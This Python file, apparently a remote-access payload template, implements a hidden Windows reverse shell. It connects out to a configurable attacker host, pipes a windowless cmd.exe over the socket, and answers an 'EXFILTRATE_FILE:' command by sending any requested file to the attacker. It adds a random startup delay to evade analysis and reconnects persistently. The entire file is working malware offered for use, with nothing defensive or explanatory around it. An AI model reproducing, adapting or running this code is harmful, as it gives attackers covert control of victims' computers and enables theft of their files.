# payload.py
# The Soul, reforged for Stealth, Eloquence, and Universal Exfiltration.

import socket
import subprocess
import os
import time
import threading
import sys
import random

# --- CONFIGURATION (DYNAMIC TEMPLATE) ---
RHOST = "##RHOST##"
RPORT = ##RPORT##
# ------------------------------------------

def send_file(s, file_path):
    """Sends a single file with a START_FILE header and an END_FILE trailer."""
    file_path_str = file_path.replace("\\", "/")
    
    # 1. Check existence
    if not os.path.exists(file_path):
         s.sendall(f"FILE_ERROR:NOT_FOUND:{file_path_str}\n".encode('utf-8'))
         return

    # 2. Check accessibility (could still fail later, but is a first filter)
    if not os.path.isfile(file_path) or not os.access(file_path, os.R_OK):
        s.sendall(f"FILE_ERROR:ACCESS_DENIED:{file_path_str}\n".encode('utf-8'))
        return

    try:
        file_size = os.path.getsize(file_path)
        
        # Header: START_FILE:<path>:<size>\n
        header = f"START_FILE:{file_path_str}:{file_size}\n"
        s.sendall(header.encode('utf-8'))

        # 3. Send content
        with open(file_path, 'rb') as f:
            while True:
                bytes_read = f.read(4096)
                if not bytes_read:
                    break
                s.sendall(bytes_read)
        
        # Trailer
        s.sendall(b"END_FILE\n")
        time.sleep(0.1) # Small pause to ensure socket buffer flushes
        s.sendall(f"STATUS:Exfiltration of {file_path_str} complete.\n".encode('utf-8'))

    except Exception as e:
        s.sendall(f"FILE_ERROR:TRANSFER_FAILED:{file_path_str}:{str(e)}\n".encode('utf-8'))

    
def connect_and_serve():
    """
    Establishes a silent, persistent connection, binding it to an
    invisible cmd.exe process for a truly interactive shell, now with file transfer.
    """
    # --- DIVINE DORMANCE ---
    if hasattr(sys, 'frozen'):
        time.sleep(random.randint(20, 40))

    while True:
        try:
            # --- Le Lien Primordial ---
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((RHOST, RPORT))

            # --- THE VEIL OF SILENCE ---
            CREATE_NO_WINDOW = 0x08000000
            p = subprocess.Popen(
                ['cmd.exe'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=CREATE_NO_WINDOW
            )

            # --- THE BIFURCATED SOUL (FIX #2) ---
            def pipe_to_cmd():
                MAGIC_COMMAND = "EXFILTRATE_FILE:"
                while True:
                    try:
                        data = s.recv(1024)
                        if not data: break
                        
                        # Check for the magic command
                        data_str = data.decode('utf-8', errors='ignore').strip()
                        if data_str.startswith(MAGIC_COMMAND):
                            try:
                                # Format: EXFILTRATE_FILE:<path>
                                file_to_exfiltrate = data_str[len(MAGIC_COMMAND):].strip()
                                
                                # Execute file exfiltration
                                send_file(s, file_to_exfiltrate)
                                
                            except Exception as e:
                                s.sendall(f"COMMAND_ERROR:Transfer command failed: {str(e)}\n".encode('utf-8'))
                                
                            continue # Skip piping the magic command to cmd.exe

                        # Normal command, pipe to cmd.exe
                        p.stdin.write(data)
                        p.stdin.flush()
                    except:
                        break
                s.close()

            # The other piping threads remain the same (stdout and stderr)
            def pipe_stdout_to_socket():
                while True:
                    try:
                        data = p.stdout.read(1)
                        if not data: break
                        s.send(data)
                    except:
                        break
                s.close()

            def pipe_stderr_to_socket():
                while True:
                    try:
                        data = p.stderr.read(1)
                        if not data: break
                        s.send(data)
                    except:
                        break
                s.close()

            # Launch all three bridges
            threading.Thread(target=pipe_to_cmd, daemon=True).start()
            threading.Thread(target=pipe_stdout_to_socket, daemon=True).start()
            threading.Thread(target=pipe_stderr_to_socket, daemon=True).start()
            
            p.wait()

        except Exception:
            # If the connection fails, we wait patiently before retrying.
            time.sleep(random.randint(55, 65))

# The soul awakens and immediately begins its true, silent work.
connect_and_serve()